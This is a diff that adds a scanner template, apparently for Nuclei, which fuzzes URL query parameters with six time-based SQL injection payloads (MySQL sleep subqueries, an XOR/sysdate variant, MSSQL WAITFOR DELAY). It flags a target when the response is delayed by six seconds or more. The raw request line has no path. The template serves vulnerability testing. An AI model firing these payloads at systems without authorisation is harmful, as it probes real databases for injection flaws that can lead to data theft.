@@ -1,0 +1,42 @@
+id: SQL-Time
+
+info:
+  name: SQL Time
+  author: vijay
+  severity: high
+  description: |
+    gau to SQL
+  reference:
+    - https://github.com/payloadbox/sql-injection-payload-list
+    - https://systemweakness.com/time-based-sql-injection-63a395434e97
+  tags: dast,sql,time
+
+http:
+  - raw:
+      - |
+        @timeout: 10s
+        GET  HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml,text/xml;q=0.9,*/*;q=0.8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+        Referer: {{BaseURL}}
+        Pragma: no-cache
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "'+(select(0)from(select(sleep(6)))v)+'"
+          - "0'XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z"
+          - "' OR CONTAINS(c.id, '6')--"
+          - "11 AND (SELECT 6657 FROM (SELECT(SLEEP(6)))DRUw)"
+          - "%27%29%3bSELECT%20SLEEP%286%29%23"
+          - "+WAITFOR DELAY+'0:0:6'"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=6'
+        condition: and
